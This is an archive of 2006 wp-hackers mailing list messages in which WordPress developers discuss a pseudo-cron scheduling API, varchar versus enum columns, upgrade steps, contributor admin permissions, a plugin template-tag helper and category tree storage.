	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
Message-ID: <5aa3aa0602091420p3720b934n3c6e8a77b504f706@mail.gmail.com>

On 2/9/06, Joey B <tunicwriter@gmail.com> wrote:
>
> <snip>
>
Furthermore, I'm not positive of how many people
> actually subscribe to wp-testers, but I know not that many people show
> up for the IRC Meetups. I'd say a good 15-20 or so on average, which
> is obviously no where near the amount of plugin authors out there.


Testing is of interest elsewhere besides the wp-testers mailing list. See
http://gfmorris.wordpress.com/2006/01/04/wordpress-needs-formal-pre-release-testing/
as an example.

I suppose "Testing" would be worthy of its own thread in relation to
Simplicity in 2.next discussion...

Craig Hartel.
Nuclear Moose.
From ryan at boren.nu  Thu Feb  9 22:31:27 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  9 22:33:02 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EB4F3E.8090604@midnightcircus.com>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>
	<43EB4F3E.8090604@midnightcircus.com>
Message-ID: <43EBC2BF.7000409@boren.nu>

Owen Winkler wrote:
> Ryan Boren wrote:
> 
>> Behold the changeset of destruction.
>>
>> http://trac.wordpress.org/changeset/3510
>>
> 
> Curious on this one point:
> 
> Why is post_type a varchar(100) and not an enum('post','page', 
> 'attachment')?  Wouldn't that be faster?

The varchar is used for portability and flexibility.  We might change 
all occurences of enums to varchars.  Those porting WordPress to other 
DBs curse our use of enums.

Ryan

From ryan at boren.nu  Thu Feb  9 23:09:39 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  9 23:11:10 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
Message-ID: <43EBCBB3.6010504@boren.nu>

Here's a quick brain storm.  I think we have this simply be a queue of 
actions with timestamps.

wp_schedule_event($timestamp, $action) {
	global $wp_event_queue;
	$args = array_slice(func_get_args(), 2);
	...
	push event on to $wp_event_queue, maybe sort by timestamp.
}

Example:

wp_schedule_event($in_a_future_age, 'publish_future_post', $post_ID);

wp_cron() would be called from somewhere.  It would do a quick timestamp 
quick to see if it is scheduled to run.  If so, it will loop through the 
event queue looking for events that are due.  It will issue a 
do_action() for every event whose time is up.

do_action('publish_future_post', $post_ID);
wp_remove_event('publish_future_post', $post_ID);

In default-filters.php would be this:

add_action('publish_future_post', 'wp_publish_post', $post_ID);

wp_publish_post() would set the post_status to publish and make sure 
pingbacks and such are issued.

Ryan
From dion at almaer.com  Thu Feb  9 23:52:18 2006
From: dion at almaer.com (Dion Almaer)
Date: Thu Feb  9 23:54:06 2006
Subject: [wp-hackers] imgsize in upload.php
In-Reply-To: <e6ec604d0602091233i4b1c1427se80bdca392bce2fc@mail.gmail.com>
Message-ID: <0e2501c62dd3$dd66d090$6801a8c0@AUSTIN>


Exactly.

I always want to tell the browser the space it needs to allocate for all
elements. This is a nice thing to do for the poor old browser, as then he
doesn't have to keep rerendering and guessing (and as Andy says, if the
image doesn't download correctly... Who knows).

This is just the default. You obviously can change the height/width/anything
else that you want.  I just prefer this as a default.

Cheers,

Dion
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Andy Skelton
> Sent: Thursday, February 09, 2006 2:33 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] imgsize in upload.php
> 
> On 2/9/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> > Also, I could understand why one would want to define the image's 
> > dimensions (or maybe the width dimension/relative size) for 
> the image 
> > to appear correctly within a post, but the full height and width? I 
> > don't see the purpose. Perhaps I'm being shortsighted.
> 
> If the image fails to load, its absence will cause the 
> surrounding text etc. to flow differently. Sometimes that's 
> bad. The effect can be avoided by specifying the height and 
> width attributes.
> 
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From wp at ebroder.net  Fri Feb 10 00:25:35 2006
From: wp at ebroder.net (Evan Broder)
Date: Fri Feb 10 00:26:53 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EBC2BF.7000409@boren.nu>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>	<43EB4F3E.8090604@midnightcircus.com>
	<43EBC2BF.7000409@boren.nu>
Message-ID: <43EBDD7F.8020607@ebroder.net>

Ryan Boren wrote:
> Owen Winkler wrote:
> The varchar is used for portability and flexibility.  We might change 
> all occurences of enums to varchars.  Those porting WordPress to other 
> DBs curse our use of enums.
>
> Ryan
In theory, should this not just be a change of the database schema, 
since code and queries will always compare values to strings anyway?

Doesn't seem like it should be that big of a deal (other than the whole 
inertia issue)

Of course, I'm new to this, and more or less an idiot, so I may not know 
what I'm talking about.

From powzor at gmail.com  Fri Feb 10 01:13:38 2006
From: powzor at gmail.com (Rob)
Date: Fri Feb 10 01:12:55 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <43EBC2BF.7000409@boren.nu>
References: <1139378764.5565.12.camel@localhost.localdomain>	<34dea5010602080204k6c8ea739x@mail.gmail.com>	<1139396935.5565.20.camel@localhost.localdomain>	<ebe43d680602080608g4fb58d74k@mail.gmail.com>	<1139428641.1474.15.camel@localhost.localdomain>	<43EA5318.6030500@midnightcircus.com>	<1139430518.1474.29.camel@localhost.localdomain>	<43EB14CD.1030806@boren.nu>	<43EB4F3E.8090604@midnightcircus.com>
	<43EBC2BF.7000409@boren.nu>
Message-ID: <43EBE8C2.9050704@robm.me.uk>

Ryan Boren wrote:
> Owen Winkler wrote:
>> Ryan Boren wrote:
>>
>>> Behold the changeset of destruction.
>>>
>>> http://trac.wordpress.org/changeset/3510
>>>
>>
>> Curious on this one point:
>>
>> Why is post_type a varchar(100) and not an enum('post','page', 
>> 'attachment')?  Wouldn't that be faster?
>
> The varchar is used for portability and flexibility.  We might change 
> all occurences of enums to varchars.  Those porting WordPress to other 
> DBs curse our use of enums.
>
> Ryan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
Is this general advice, to be applied to plugins as well?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From ringmaster at midnightcircus.com  Fri Feb 10 02:08:34 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 10 02:10:30 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EBCBB3.6010504@boren.nu>
References: <43EBCBB3.6010504@boren.nu>
Message-ID: <43EBF5A2.1090206@midnightcircus.com>

Ryan Boren wrote:
> Here's a quick brain storm.  I think we have this simply be a queue of 
> actions with timestamps.

<snip>

Rephrasing my understanding:

A user publishes a post for a future date.
The post page adds that as a post_type = 'future' and sets the date for 
the future.
The post page calls wp_schedule_event($post_date_gmt, 
'publish_future_post', $post_ID); to set up the event.

A few days later, elsewhere in the code...

wp_cron() gets called based on a check of a timestamp (against what?) 
from a location that is yet to be determined (shutdown?).
wp_cron() gets a list of the scheduled events (where was this stored?) 
that have an execution time <= time().
Foreach item in that list, call the assigned plugin hook, with the post_ID.
The plugin hook for 'publish_future_post' has a default sink function 
that publishes the specified post.

Ok.

Is the third parameter of wp_schedule_event() an all-purpose value?  Can 
it be things other than a post_ID?  Can there be more parameters 
(please)?  (I might like to schedule a check to see if a Link needed 
updating, rather than a post, for example.)

Will the pseudocron require that regularly recurring events be 
rescheduled during each execution?  Calling wp_remove_event() as 
described could be a problem for recurring events.

Also, while I'm thinking about it...  What existing hooks will be fired 
during all of this?  My thought is that save_post should fire on every 
save, whether on future posts whose time hasn't come or posts that have 
been published already.  publish_post should only ever be called once 
under normal circumstances - when changing from post_status 'draft' to 
'publish'.  I know others have opinions on this, and although I'm not 
personally concerned about it (thus not attached to this suggestion), 
it's a point for discussion.

Owen
From mark.wordpress at txfx.net  Fri Feb 10 02:35:51 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb 10 02:37:29 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EBF5A2.1090206@midnightcircus.com>
References: <43EBCBB3.6010504@boren.nu> <43EBF5A2.1090206@midnightcircus.com>
Message-ID: <63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>

On Feb 9, 2006, at 9:08 PM, Owen Winkler wrote:

> Will the pseudocron require that regularly recurring events be  
> rescheduled during each execution?  Calling wp_remove_event() as  
> described could be a problem for recurring events.

Ick, I hope not.  every_X_minutes, every_X_hours, every_X_ days is  
the way to go.  It's a bit more work initially (writing the backend  
for it), but it will make it much easier for plugin authors... no  
need to keep re-adding things and calculating times and stuff.
--
Mark Jaquith
http://txfx.net/


From wp at ebroder.net  Fri Feb 10 02:56:02 2006
From: wp at ebroder.net (Evan Broder)
Date: Fri Feb 10 02:58:35 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>
References: <43EBCBB3.6010504@boren.nu> <43EBF5A2.1090206@midnightcircus.com>
	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>
Message-ID: <43EC00C2.70600@ebroder.net>

Mark Jaquith wrote:
> Ick, I hope not.  every_X_minutes, every_X_hours, every_X_ days is the 
> way to go.  It's a bit more work initially (writing the backend for 
> it), but it will make it much easier for plugin authors... no need to 
> keep re-adding things and calculating times and stuff.
> -- 
> Mark Jaquith
> http://txfx.net/
If this is actually going to happen, would it not just be easier to 
integrate Skippy's WP-Cron into wp-core? I mean, it sounds like that's 
essentially what's being suggested, so why rewrite code that already exists?
From david at coppit.org  Fri Feb 10 03:15:08 2006
From: david at coppit.org (David Coppit)
Date: Fri Feb 10 03:16:49 2006
Subject: [wp-hackers] Re: Simplicity in 2.next
In-Reply-To: <5aa3aa0602091420p3720b934n3c6e8a77b504f706@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<5aa3aa0602091420p3720b934n3c6e8a77b504f706@mail.gmail.com>
Message-ID: <Pine.BSF.4.64.0602092209340.66264@www.provisio.net>

Sorry if this has already been mentioned. I just upgraded to 2.0.1 and was
struck again by how amazingly difficult the upgrade is. Actually once you
hit the web upgrade page all is easy, but before that all is not.

- Back up files
- Back up database
- Unpack files
- Delete old files, but not x, y, z
- Move over new files
- diff old and new wp-content directories to see if default plugins were
   upgraded
- Do web upgrade
- Activate plugins
- Reinstall WPG2 because I accidentally deleted the wp-gallery2.php file
   in the base directory.

I wish the release articles just had a "click here to being upgrade" link
that would tell Wordpress to download the latest release version, then
automatically do almost all of the above steps. It would overwrite the
existing files, ask you delete files that are obsolete, reactivate
plugins, etc.

Compare the WP upgrade process to Gallery2, for example.

David

_____________________________________________________________________
David Coppit                           david@coppit.org
The College of William and Mary        http://coppit.org/

"If we knew what it was we were doing, it would not be called research,
would it?" -- Albert Einstein
From robs_wph at rs-tc.com  Fri Feb 10 03:23:48 2006
From: robs_wph at rs-tc.com (Rob Schumann)
Date: Fri Feb 10 03:25:33 2006
Subject: [wp-hackers] Disabling 'Manage' menu in admin
Message-ID: <r02010500-1039-A72E60E299E411DA971D003065B8E592@[192.168.1.3]>

Hi,

I'd like to disable the entire 'Manage' menu in admin for
'Contributors', but cannot see a straightforward way for
doing this without denying those same contributors to
contribute new articles to the blog.

The reason this has become an issue with the blog's owner is
that under the 'Manage' menu contributors get to see
everything posted within the system, not just the content
they themselves have created. Granted they can't do anything
damaging to the posts themselves, but they should not be
able to see stuff that was written by others, especially if
it is not yet publicly available through the website itself.

The same goes for comments.. Here there is also a problem on
the dashboard where the 'edit' option is provided against
every comment listed, irrespective of whether the logged-in
contributor has editing rights for those comments.

I'd like to be able to remove the whole 'Manage section'
from the Contributor's admin view, as well as tidy up the
dashboard (not list content they shouldn't see, not show
'edit' where editing isn't possible), but without affecting
their ability to create new content, and I'd like to do it,
if at all possible, without hacking at the WP core... too
much ;)

Question is, how?

Any pointers would be gratefully received.

Best regards

Rob
From ringmaster at midnightcircus.com  Fri Feb 10 03:30:23 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 10 03:32:21 2006
Subject: [wp-hackers] Disabling 'Manage' menu in admin
In-Reply-To: <r02010500-1039-A72E60E299E411DA971D003065B8E592@[192.168.1.3]>
References: <r02010500-1039-A72E60E299E411DA971D003065B8E592@[192.168.1.3]>
Message-ID: <43EC08CF.9010206@midnightcircus.com>

Rob Schumann wrote:
> I'd like to disable the entire 'Manage' menu in admin for
> 'Contributors', but cannot see a straightforward way for
> doing this without denying those same contributors to
> contribute new articles to the blog.
> 
> Question is, how?

http://wordpress.org/support/topic/54017#post-319165

Owen
From lists at mattread.com  Fri Feb 10 05:40:48 2006
From: lists at mattread.com (Matt Read)
Date: Fri Feb 10 05:40:53 2006
Subject: [wp-hackers] plugin template tag function
Message-ID: <200602100040.48565.lists@mattread.com>

I think it would be nice if there was a function for calling plugin functions 
from templates; it would check if the function exists etc.

Here's one I came up with:


function plugin_template_tag($function, $args = '') {
	if (is_array($function)) {
		if (is_object($function[0])) {
			call_user_func_array($function, $args);
		}
		elseif (class_exists($function[0])) {
			call_user_func_array($function, $args);
		}
	}
	else {
		if (function_exists($function)) {
			call_user_func_array($function, $args);
		}
	}
}


-- 
Matthew Read
http://www.mattread.com/
From peter.westwood at ftwr.co.uk  Fri Feb 10 07:43:42 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri Feb 10 07:45:22 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>
References: <43EBCBB3.6010504@boren.nu> <43EBF5A2.1090206@midnightcircus.com>
	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>
Message-ID: <43EC442E.8080206@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Jaquith wrote:
> On Feb 9, 2006, at 9:08 PM, Owen Winkler wrote:
> 
>> Will the pseudocron require that regularly recurring events be
>> rescheduled during each execution?  Calling wp_remove_event() as
>> described could be a problem for recurring events.
> 
> Ick, I hope not.  every_X_minutes, every_X_hours, every_X_ days is the
> way to go.  It's a bit more work initially (writing the backend for it),
> but it will make it much easier for plugin authors... no need to keep
> re-adding things and calculating times and stuff.

Indeed interval based pseudocron is much more powerful than only
allowing single events..

Single events are useful if you want to do something only once - maybe
schedule a theme change for your birthday perhaps?

Storing data with the cronjob itself e.g. post_ID or something else
seems a little dangerous - in the case of publishing future posts do we
really save that much by not querying the DB for the post_ID at publish
time - after all we will have to interact with the DB to do the publish
itself.

I like the idea of every_X_minutes but I think we also need to be able
to specify things like time of day for every_X_days - you want to be
able to schedule things for non-busy times.

An API more like the following may be more useful:

wp_schedule_single_event($unixtimestamp, 'function to call');

wp_schedule_repeating_event('interval-type','interval-amount','time-of-day/hour/week');

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD7EQuVPRdzag0AcURAvLMAJ9FWmhx7o/ieTWgSD92rbk6Lk3rdgCgzvl3
+qHp3Se4uY1oMcKTzFcSsHo=
=mhpb
-----END PGP SIGNATURE-----

From jeff at jrm.cc  Fri Feb 10 08:08:46 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Fri Feb 10 08:10:37 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <BAY106-F30CDD47C2B00BD22C1F0B39E030@phx.gbl>
References: <BAY106-F30CDD47C2B00BD22C1F0B39E030@phx.gbl>
Message-ID: <43EC4A0E.4070008@jrm.cc>

Christopher Johnson wrote:
> Had anyone ever considered using a modified pre-order tree to store the 
> post categories in?

Excuse the simpleton, but what in hay-diddly is that? Some links and/or 
examples would be helpful.

Jeff
From jeff at jrm.cc  Fri Feb 10 08:17:25 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Fri Feb 10 08:19:11 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC442E.8080206@ftwr.co.uk>
References: <43EBCBB3.6010504@boren.nu>
	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>
	<43EC442E.8080206@ftwr.co.uk>
Message-ID: <43EC4C15.5070904@jrm.cc>

Peter Westwood wrote:
> wp_schedule_repeating_event('interval-type','interval-amount','time-of-day/hour/week');


May I suggest we take a page from "The History of Every Unix Ever" and 
at least make the psuedo cron scheduler something that people can learn 
just once?

wp_schedule_repeating_event($minute, $hour, $dayofmonth, $month, 
$dayofweek, $filter_to_activate);

The whole "* * * * *" thing.

Jeff
From ryan at boren.nu  Fri Feb 10 08:27:42 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Feb 10 08:29:22 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC4C15.5070904@jrm.cc>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>
	<43EC4C15.5070904@jrm.cc>
Message-ID: <43EC4E7E.1010208@boren.nu>

Jeff Minard wrote:
> May I suggest we take a page from "The History of Every Unix Ever" and 
> at least make the psuedo cron scheduler something that people can learn 
> just once?
> 
> wp_schedule_repeating_event($minute, $hour, $dayofmonth, $month, 
> $dayofweek, $filter_to_activate);
> 
> The whole "* * * * *" thing.

Hah!  I'm with you there.  Even after over a decade of dealing with 
crontab files I still have to scratch my head and look at man pages 
whenever I edit one.

Ryan
From m at mullenweg.com  Fri Feb 10 09:07:24 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Fri Feb 10 09:09:40 2006
Subject: [wp-hackers] Re: Simplicity in 2.next
In-Reply-To: <Pine.BSF.4.64.0602092209340.66264@www.provisio.net>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>	<43E9F1D6.3030505@ryanduff.net>	<ebe43d680602080610g58468270u@mail.gmail.com>	<1139428294.1474.11.camel@localhost.localdomain>	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>	<5aa3aa0602091420p3720b934n3c6e8a77b504f706@mail.gmail.com>
	<Pine.BSF.4.64.0602092209340.66264@www.provisio.net>
Message-ID: <43EC57CC.8080108@mullenweg.com>

David Coppit wrote:
> - Back up files
> - Back up database
> - Unpack files
> - Delete old files, but not x, y, z
> - Move over new files
> - diff old and new wp-content directories to see if default plugins were
>   upgraded
> - Do web upgrade
> - Activate plugins
> - Reinstall WPG2 because I accidentally deleted the wp-gallery2.php file
>   in the base directory.

This could be simplified:

1. Overwrite your old files with the new ones, including bundled plugins
2. Load your admin, it should tell you if you need to run a DB upgrade

2.0 -> 2.0.1 doesn't require the whole kit and kaboodle of upgrading, 
most of what you described above was either assumed or precautionary or 
a mistake.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From lists at viper007bond.com  Fri Feb 10 11:19:16 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Fri Feb 10 11:20:50 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <20060209231114.32274638F@comox.textdrive.com>
References: <20060209231114.32274638F@comox.textdrive.com>
Message-ID: <43EC76B4.4000500@viper007bond.com>

I'm using the digest method as I don't want 50 e-mails a day in my inbox
and as a result, the attached didn't seem to come through. Mind
sending it directly to me? Thanks!  :)

- Viper

-------------------------
Website: http://www.viper007bond.com/
AIM: Viper007Bond
MSN: msn@viper007bond.com
ICQ: 150093386
Yahoo: Viper007Bonddotcom
GTalk: Viper007Bond@gmail.com
Jabber: Viper007Bond@Jabber.org
Xfire: viper007bond

 > Message: 3
 > Date: Thu, 09 Feb 2006 13:19:43 -0500
 > From: Dougal Campbell <dougal@gunters.org>
 > Subject: Re: [wp-hackers] Documentation on the caching functions?
 > To: wp-hackers@lists.automattic.com
 > Message-ID: <43EB87BF.3000906@gunters.org>
 > Content-Type: text/plain; charset="iso-8859-1"
 >
 > Viper007Bond wrote:
 >> Thanks, but I was looking for something a bit more elegant.
 >> I mean, I'm not really looking for a quick and dirty hack here. I now
 >> what I'm doing when it comes to WordPress plugins, so it's not like
 >> coding this up will be hard by any means. I just don't know how to use
 >> the new caching functions (parameters and such) and thought I'd ask
 >> before I went source reading to learn how they work.  ;)
 >
 > I had the same question recently. After looking at cache.php, and
 > associated bits of code, I was pretty sure I had the idea. I emailed
 > Ryan, and he confirmed that pretty much all you need are the
 > wp_cache_set() and wp_cache_get() functions. Message attached.
From false.hopes at gmail.com  Fri Feb 10 12:16:59 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 10 12:18:36 2006
Subject: [wp-hackers] plugin template tag function
In-Reply-To: <200602100040.48565.lists@mattread.com>
References: <200602100040.48565.lists@mattread.com>
Message-ID: <a491f91d0602100416l3bcecd75w89b043311e513328@mail.gmail.com>

On 2/10/06, Matt Read <lists@mattread.com> wrote:
> I think it would be nice if there was a function for calling plugin functions
> from templates; it would check if the function exists etc.
>
> Here's one I came up with:
>
>
> function plugin_template_tag($function, $args = '') {
>         if (is_array($function)) {
>                 if (is_object($function[0])) {
>                         call_user_func_array($function, $args);
>                 }
>                 elseif (class_exists($function[0])) {
>                         call_user_func_array($function, $args);
>                 }
>         }
>         else {
>                 if (function_exists($function)) {
>                         call_user_func_array($function, $args);
>                 }
>         }
> }

Personally, I like the idea that was discussed a few months back,
where plugins tell users to put a do_action('plugin_template_hook');
or somesuch in the theme, so that it degrades nicely as well. Its a
bit shorter and achieves the same purpose.

--
--Robert Deaton
http://somethingunpredictable.com
From if.website at gmail.com  Fri Feb 10 12:29:18 2006
From: if.website at gmail.com (Austin Matzko)
Date: Fri Feb 10 12:30:56 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <43E61C39.5060601@jamietalbot.com>
References: <C00B05AC.F16C%apakuni@gmail.com> <43E61A1B.20008@zenenet.com>
	<43E61C39.5060601@jamietalbot.com>
Message-ID: <674b4a3b0602100429l1f8e0587vfa0408d47cc2821b@mail.gmail.com>

On 2/5/06, Jamie Talbot <wphackers@jamietalbot.com> wrote:
> As a side-issue, I want to place a checkbox next to the Delete Button on the edit page.  I added it in edit_form_advanced with javascript to append it in the right place, but IE dies with a fatal error every time.  Apparently, it doesn't like the DOM being altered before the page is fully
loaded, which I think is because the preview pane is still loading at
that time.  Anybody think of a way to do this?

How about using the addEvent event listener function ( seen here:
http://www.sitepoint.com/article/structural-markup-javascript ) to add
your JavaScript only when the page has finished loading?
From skeltoac at gmail.com  Fri Feb 10 12:41:32 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb 10 12:43:06 2006
Subject: [wp-hackers] plugin template tag function
In-Reply-To: <a491f91d0602100416l3bcecd75w89b043311e513328@mail.gmail.com>
References: <200602100040.48565.lists@mattread.com>
	<a491f91d0602100416l3bcecd75w89b043311e513328@mail.gmail.com>
Message-ID: <e6ec604d0602100441gaa56104ja18bc7c3a9290916@mail.gmail.com>

On 2/10/06, Robert Deaton <false.hopes@gmail.com> wrote:
> Personally, I like the idea that was discussed a few months back,
> where plugins tell users to put a do_action('plugin_template_hook');
> or somesuch in the theme, so that it degrades nicely as well. Its a
> bit shorter and achieves the same purpose.

+1 for elegance
From ringmaster at midnightcircus.com  Fri Feb 10 12:50:12 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 10 12:52:08 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <43EC76B4.4000500@viper007bond.com>
References: <20060209231114.32274638F@comox.textdrive.com>
	<43EC76B4.4000500@viper007bond.com>
Message-ID: <43EC8C04.9020401@midnightcircus.com>

Viper007Bond wrote:
> I'm using the digest method as I don't want 50 e-mails a day in my inbox
> and as a result, the attached didn't seem to come through. Mind
> sending it directly to me? Thanks!  :)

The attachment didn't make it to the regular mailing list, either.

Is there someplace we can use to regularly drop these attachments, since 
we seem to be losing a lot of them?

Owen

From skippy at skippy.net  Fri Feb 10 12:54:36 2006
From: skippy at skippy.net (Scott Merrill)
Date: Fri Feb 10 12:55:55 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC4C15.5070904@jrm.cc>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>
	<43EC4C15.5070904@jrm.cc>
Message-ID: <43EC8D0C.6010606@skippy.net>

Jeff Minard wrote:
> Peter Westwood wrote:
>> wp_schedule_repeating_event('interval-type','interval-amount','time-of-day/hour/week');
>>
> 
> 
> May I suggest we take a page from "The History of Every Unix Ever" and
> at least make the psuedo cron scheduler something that people can learn
> just once?
> 
> wp_schedule_repeating_event($minute, $hour, $dayofmonth, $month,
> $dayofweek, $filter_to_activate);
> 
> The whole "* * * * *" thing.

If you need that level of precision, I think a real cron job is more
approrpiate.  Let's not re-invent the wheel.  Power users will know how
to use the system's cron facility, and non-power users are unlikely to
care about the elegance of any implementation we create.

My WP-Cron plugin is not at all precise.  It might be due to poor coding
on my part.  Everyone here is welcome to rip it apart and use whatever
bits they want for any future cron workalike.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From agent_eight at hotmail.com  Fri Feb 10 13:33:07 2006
From: agent_eight at hotmail.com (Christopher Johnson)
Date: Fri Feb 10 13:34:44 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <20060210120005.96ABB610E@comox.textdrive.com>
Message-ID: <BAY106-F1058AF149EB2432A9983B49E020@phx.gbl>

> > Had anyone ever considered using a modified pre-order tree to store the
> > post categories in?
>
>Excuse the simpleton, but what in hay-diddly is that? Some links and/or
>examples would be helpful.

A modified preorder tree is a method of storing hierarchal data in a 
database. This article provides a much better explanation than I'm capable 
of ... http://www.sitepoint.com/article/hierarchical-data-database

The method requires a little more work during inserts and updates but allows 
for much faster and much more flexible queries. An example ... with this 
method you could extract an entire sub tree from the categories table with 
only 1 query and no sub-selects (2 joins). No recursive post processing is 
needed either. When retrieving posts by category, multiple sub tree's could 
be excluded or included with a single query (2 joins). The path to a 
category, a list of siblings, a list of children, all can be retreived with 
single query, but not at the same time of course.

The multiple inclusion/exclusion of hierarchies feature is what really calls 
to me. Granted, doing inclusion "and" exclusion at the same time would 
require a couple queries without sub-selects.

If anyone is interested and/or thinks this might be a good addition, I've 
got some prototypes I could share.


From wantmoore at gmail.com  Fri Feb 10 14:02:36 2006
From: wantmoore at gmail.com (Justin Moore)
Date: Fri Feb 10 14:04:12 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <43EC8C04.9020401@midnightcircus.com>
References: <20060209231114.32274638F@comox.textdrive.com>
	<43EC76B4.4000500@viper007bond.com>
	<43EC8C04.9020401@midnightcircus.com>
Message-ID: <75835fe10602100602j7fdd98c2r1fb7083750b0bafc@mail.gmail.com>

On 2/10/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Is there someplace we can use to regularly drop these attachments, since
> we seem to be losing a lot of them?

Didn't Mark used to have some sort of "dropbox" on
weblogtoolscollection.com? Or there's http://www.yousendit.com which
I've had a couple of people use to send me files before. Both are only
a temporary mechanism though and the files wouldn't be preserved for
long-term archiving.

--
Justin Moore
aka wantmoore
---------------------------------------
www.wantmoore.com
From wphackers at jamietalbot.com  Fri Feb 10 14:07:36 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb 10 14:09:32 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <674b4a3b0602100429l1f8e0587vfa0408d47cc2821b@mail.gmail.com>
References: <C00B05AC.F16C%apakuni@gmail.com>
	<43E61A1B.20008@zenenet.com>	<43E61C39.5060601@jamietalbot.com>
	<674b4a3b0602100429l1f8e0587vfa0408d47cc2821b@mail.gmail.com>
Message-ID: <43EC9E28.7030105@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Austin Matzko wrote:
> On 2/5/06, Jamie Talbot <wphackers@jamietalbot.com> wrote:
>> As a side-issue, I want to place a checkbox next to the Delete Button on the edit page.  I added it in edit_form_advanced with javascript to append it in the right place, but IE dies with a fatal error every time.  Apparently, it doesn't like the DOM being altered before the page is fully
> loaded, which I think is because the preview pane is still loading at
> that time.  Anybody think of a way to do this?
> 
> How about using the addEvent event listener function ( seen here:
> http://www.sitepoint.com/article/structural-markup-javascript ) to add
> your JavaScript only when the page has finished loading?

